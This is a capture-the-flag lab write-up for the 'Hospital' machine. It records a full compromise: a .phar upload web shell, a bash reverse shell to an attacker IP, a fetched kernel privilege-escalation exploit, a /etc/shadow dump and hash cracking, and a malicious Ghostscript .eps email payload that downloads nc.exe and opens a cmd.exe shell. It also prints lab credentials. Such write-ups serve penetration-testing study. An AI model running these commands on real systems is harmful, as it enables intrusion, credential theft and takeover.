# HOSPITAL
## RECON
- Domain name hospital.htb
- WINDOWS 
- https://10.10.11.241/                 wemail login page
- jquery
- elastic
- 3389 windows remote desktop ?
- http://hospital.htb:8080/uploads/     FORBIDDEN

http://10.10.11.241:8080/login.php    
after creeating a user we can find a file upload form, upload a file i dont see any way to retrieve the url of the uploaded file http://10.10.11.241:8080/images/ or /uploads/ is Forbidden

we test all of the smbmap / crackmapexec / enum4linux / smbclient no luck here 

after uploading a .phar file we can see that the file is indeed in /uploads 
lets try to send some reverseshell with a .phar extension
it's working but the shell gets rejected right away
```
WARNING: Failed to daemonise. This is quite common and not fatal. ERROR: Can't spawn shell 
```
with pownyshell its working
```
www-data@webserver:…/www/html# cat config.php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'my$qls3rv1c3!');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
oddly enough we are on a ubuntu machine 
```
www-data@webserver:…/html/uploads# cat /etc/os-release
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=lunar
LOGO=ubuntu-logo
```

the uploaded files are being erased quite often so lets make a more stable reverseshell 
```
/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.28/4444 0>&1'
```
looks like ubuntu 23.04 has CVE 
```
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
```
```
www-data@webserver:/tmp$ curl http://10.10.14.28:8000/exploit.sh > exploit.sh
curl http://10.10.14.28:8000/exploit.sh > exploit.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   559  100   559    0     0   9094      0 --:--:-- --:--:-- --:--:--  9163
www-data@webserver:/tmp$ sh exploit.sh
sh exploit.sh
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
whoami
root
```
we can see on the server the user drwilliams
```
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
mysql:!:19620::::::
```
hashcat the drwilliams line we get 
```
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```
try this on the webmail server we can connect

on the mail we can find here we can see there is a story about .eps files lets check if we can craft a malicious one
```
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
```
create a .eps reverse shell
```
CVE_2023_36664_exploit.py --generate --revshell -ip 10.10.14.28 -port 4242 --filename trigger_revshell --extension eps
```
lets send him the needle :)
no callback lets try something else

after downloading the windows nc
we use the script to create the curl who will download the file on the windows box
```
python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.28:8000/nc.exe -o nc.exe" --filename file.eps
```
we got a callback the windows box has downloaded it
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.241 - - [09/Dec/2023 18:13:33] "GET /gs10011w64.exe HTTP/1.1" 200 -
```
lets do the second command to make the box execute the executable 
```
python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.28 4242 -e cmd.exe" --filename file.eps
```
and send it to the good doctor 

now we've got a shell and we can find in the same directory ghostcript.bat

```
C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
C:\Users\drbrown.HOSPITAL\Documents>dir ../
dir ../
Invalid switch - "".
```

looks like a password here chr!$br0wn along with access for pscredential hospital\drbrown
try them on 
```
rpcclient -U "drbrown" 10.10.11.241
```
we can find here 
```
rpcclient $> querydispinfo
index: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH  Name: (null)    Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown       Name: Chris Brown       Desc: (null)
index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams    Name: Lucy Williams     Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8  Name: Microsoft Exchange        Desc: (null)
index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309  Name: Microsoft Exchange        Desc: (null)
index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db  Name: Microsoft Exchange        Desc: (null)
index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98  Name: Microsoft Exchange Migration      Desc: (null)
```

nothing look interresting here 

into C:\Users\drbrown.HOSPITAL\Desktop> we can find user.txt


i figure webmail needs administrator access to work so 
upload a webshell into C:\xampp\htdocs looks like this is the folder of the webmail 
```
curl 10.10.14.28:8000/pownyshell.php -o powny.php
```

go to 

```
https://hospital.htb/powny.php
```

We have now access to C:\Users\Administrator\Desktop where there is root.txt

Rooted
